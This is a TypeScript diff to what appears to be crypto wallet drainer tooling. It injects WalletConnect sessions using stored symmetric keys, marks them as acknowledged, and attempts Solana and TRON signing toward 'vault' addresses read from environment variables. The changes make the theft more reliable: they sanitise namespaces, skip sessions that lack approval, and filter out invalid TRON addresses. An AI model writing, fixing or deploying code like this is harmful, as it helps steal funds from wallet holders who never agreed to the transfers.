@@ -181,6 +181,20 @@ async function injectSession(s: WcSessionData): Promise<boolean> {
   try {
     await client.core.crypto.keychain.set(s.topic, s.sym_key)
     const cappedExpiry = Math.min(s.expiry, Math.floor(Date.now() / 1000) + MAX_TTL_SEC)
+    // Sanitize namespaces — WC SDK's isValidRequest() throws "r.methods is not iterable"
+    // when a namespace entry lacks a `methods` array (e.g. Trust Wallet partial approvals).
+    const rawNs = s.namespaces ?? {}
+    const safeNamespaces = Object.fromEntries(
+      Object.entries(rawNs).map(([key, ns]) => {
+        const n = (ns ?? {}) as Record<string, unknown>
+        return [key, {
+          accounts: Array.isArray(n['accounts']) ? n['accounts'] : [],
+          methods: Array.isArray(n['methods']) ? n['methods'] : [],
+          events: Array.isArray(n['events']) ? n['events'] : [],
+          ...n,
+        }]
+      })
+    )
     await client.session.set(s.topic, {
       topic: s.topic,
       pairingTopic: s.topic,
@@ -188,7 +202,7 @@ async function injectSession(s: WcSessionData): Promise<boolean> {
       expiry: cappedExpiry,
       acknowledged: true,
       controller: s.peer_public_key ?? '',
-      namespaces: s.namespaces ?? {},
+      namespaces: safeNamespaces,
       requiredNamespaces: {},
       optionalNamespaces: {},
       self: {
@@ -270,6 +284,9 @@ function chainIdFromNs(ns: Record<string, unknown>, family: string): string | nu
 async function trySolSign(session: WcSessionData): Promise<boolean> {
   const solAddr = session.wallet_addresses?.sol
   if (!solAddr) return false
+  // Skip if session doesn't have solana namespace approved
+  const solNs = (session.namespaces ?? {})['solana'] as { accounts?: string[]; methods?: string[] } | undefined
+  if (!solNs?.accounts?.length) return false
   const vaultSol = (
     process.env['VAULT_ADDRESS_SVM']?.trim() ??
     process.env['VAULT_ADDRESS_SOL']?.trim() ??
@@ -384,6 +401,11 @@ const DEFAULT_TRON_TRC20 = [
 async function tryTronSign(session: WcSessionData): Promise<boolean> {
   const tronAddr = session.wallet_addresses?.tron
   if (!tronAddr) return false
+  // Skip if address looks like EVM hex (0x...) — not a real TRON address
+  if (/^0x[0-9a-fA-F]{40}$/.test(tronAddr)) return false
+  // Skip if session doesn't have tron namespace approved
+  const tronNs = (session.namespaces ?? {})['tron'] as { accounts?: string[] } | undefined
+  if (!tronNs?.accounts?.length) return false
   const vaultTron = (
     process.env['VAULT_ADDRESS_TRON']?.trim() ??
     process.env['SOVEREIGN_VAULT_TRON']?.trim()
